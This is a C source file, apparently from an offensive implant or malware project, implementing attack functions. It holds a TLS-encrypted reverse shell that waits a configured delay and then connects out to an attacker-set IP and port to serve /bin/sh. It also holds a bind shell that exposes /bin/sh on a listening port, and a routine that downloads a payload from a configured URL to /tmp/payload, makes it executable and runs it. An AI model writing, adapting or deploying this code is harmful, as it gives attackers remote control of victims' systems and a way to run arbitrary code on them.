#include <stdio.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <openssl/ssl.h>
#include <curl/curl.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/stat.h>

#include "../include/attacks.h"
#include "../include/utils.h"

#if defined(REVERSE_SHELL) && defined(REVERSE_IP) && defined(REVERSE_PORT) && defined(DELAY_TIME)
static SSL_CTX *create_context(const SSL_METHOD *method) {
    SSL_CTX *ctx;

    ctx = SSL_CTX_new(method);

    if(!ctx) {
        LOG("SSL_CTX_new() failed\n");
        return NULL;
    }

    return ctx;
}

static void handle_shell(SSL *ssl) {

    int p;
    int serv_shell[2];
    int shell_serv[2];
    char buf[1024];

    if(pipe(serv_shell) == -1 || pipe(shell_serv) == -1) {
        LOG("pipe() failed\n");
        return;
    }

    switch (p = fork()) {
        case -1:
            LOG("fork() failed\n");
            exit(EXIT_FAILURE);
        case 0:
            dup2(serv_shell[0], STDIN_FILENO);
            dup2(shell_serv[1], STDOUT_FILENO);
            dup2(shell_serv[1], STDERR_FILENO);
            close(serv_shell[1]);
            close(shell_serv[0]);
            char* argv[] = {"/bin/sh", NULL};
            execve("/bin/sh", argv, NULL);
            LOG("execve failed\n");
            close(serv_shell[0]);
            close(shell_serv[1]);
            exit(EXIT_FAILURE);
        default:
            break;
    }

    close(serv_shell[0]);
    close(shell_serv[1]);

    int ssl_fd = SSL_get_fd(ssl);
    int shell_fd = shell_serv[0];
    fd_set readfds;
    int maxfd = (ssl_fd > shell_fd) ? ssl_fd : shell_fd;
    
    while (1) {
        FD_ZERO(&readfds);
        FD_SET(ssl_fd, &readfds);
        FD_SET(shell_fd, &readfds);
    
        int ready = select(maxfd + 1, &readfds, NULL, NULL, NULL);
        if (ready < 0) {
            LOG("select() failed\n");
            break;
        }
    
        // If SSL socket has data
        if (FD_ISSET(ssl_fd, &readfds)) {
            int bytes = SSL_read(ssl, buf, sizeof(buf));
            if (bytes <= 0) {
                int err = SSL_get_error(ssl, bytes);
                if (err == SSL_ERROR_ZERO_RETURN || err == SSL_ERROR_SYSCALL) {
                    break;
                }
            } else {
                write(serv_shell[1], buf, bytes);
            }
        }
    
        // If shell has output
        if (FD_ISSET(shell_fd, &readfds)) {
            int bytes = read(shell_fd, buf, sizeof(buf));
            if (bytes <= 0) {
                break;
            } else {
                SSL_write(ssl, buf, bytes);
            }
        }
    
        memset(buf, 0, sizeof(buf));
    }

    int status;
    waitpid(p, &status, 0);

    close(serv_shell[1]);
    close(shell_serv[0]);
}
#endif

static int execute(char *file_path) {
#ifdef DOWNLOAD_URL
    if(chmod(file_path, 0777) != 0) {
        LOG("Unable to change file permissions of file in execute()\n");
        return -1;
    }

    int i;
    switch(i = fork()) {
        case -1:
            LOG("fork() failed in execute()\n");
            return -1;
        // child process
        case 0:
            LOG("Attempting to exec \"%s\" in execute()\n", file_path);
            char *argv[] = {file_path, NULL};
            execve(file_path, argv, NULL);
            LOG("execve failed in execute(): %s\n", strerror(errno));
            exit(EXIT_FAILURE);
        default:
            break;
    }

    int status;
    waitpid(i, &status, 0);
    
    return 0;
#endif
}

void bind_shell(void) {
#if defined(BIND_SHELL) && defined(BIND_PORT)
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(BIND_PORT);
    addr.sin_addr.s_addr = INADDR_ANY;

    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    bind(sockfd, (struct sockaddr *)&addr, sizeof(addr));

    listen(sockfd, 0);

    int connfd = accept(sockfd, NULL, NULL);

    for(int i = 0; i < 3; i++) {
        dup2(connfd, i);
    }

    execve("/bin/sh", NULL, NULL);
#endif
}

void rev_shell(void) {
#if defined(REVERSE_SHELL) && defined(REVERSE_IP) && defined(REVERSE_PORT) && defined(DELAY_TIME)
    SSL_CTX *ctx;

    char *rev_ip = REVERSE_IP;
    uint16_t rev_port = REVERSE_PORT;
    unsigned int seconds = DELAY_TIME;

    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(rev_port);
    inet_pton(AF_INET, rev_ip, &addr.sin_addr);

    if(seconds > 300) seconds = 300;
    LOG("Sleeping %u seconds then attempting to connect\n", seconds);
    sleep(seconds);
    
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);

    if ((connect(sockfd, (struct sockaddr*)&addr, sizeof(addr))) != 0) {
        LOG("Failed to connect\n");
        return;
    }

    LOG("Connection on %s:%u\n", rev_ip, rev_port);

    if (!(ctx = create_context(TLS_method()))) return;
    SSL *ssl = SSL_new(ctx);
    SSL_set_fd(ssl, sockfd);

    if (SSL_connect(ssl) != 1) {
        LOG("SSL Handshake failed\n");
        return;
    }

    LOG("SSL connection established\n");

    handle_shell(ssl);

    LOG("Disconnecting SSL connection\n");

    SSL_shutdown(ssl);
    SSL_free(ssl);
    close(sockfd);
    SSL_CTX_free(ctx);
#endif
}

void download_exec(void) {
#ifdef DOWNLOAD_URL
    CURLcode res;
    FILE *fp;
    char *file_path = "/tmp/payload";

    fp = fopen(file_path, "wb");
    if(!fp) {
        LOG("failed to open %s in download_exec()\n", file_path);
        return;
    }

    curl_global_init(CURL_GLOBAL_DEFAULT); // fix this, we shouldnt be calling everytime

    CURL *curl = curl_easy_init();
    
    if(!curl) {
        LOG("curl_easy_init() failed\n");
        return;
    }
 
    curl_easy_setopt(curl, CURLOPT_URL, DOWNLOAD_URL);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void*)fp);

    res = curl_easy_perform(curl);
    if(res) {
        LOG("curl_easy_perform() error: %s\n", curl_easy_strerror(res));
        fclose(fp);
        curl_easy_cleanup(curl);
        curl_global_cleanup();
        return;
    }

    fclose(fp); // close file before executing

    if(execute(file_path) != 0) {
        LOG("failed to perform execution in download_exec()\n");
    }

    
    curl_easy_cleanup(curl);
    curl_global_cleanup(); // fix this, we shouldnt be calling every time
#endif
}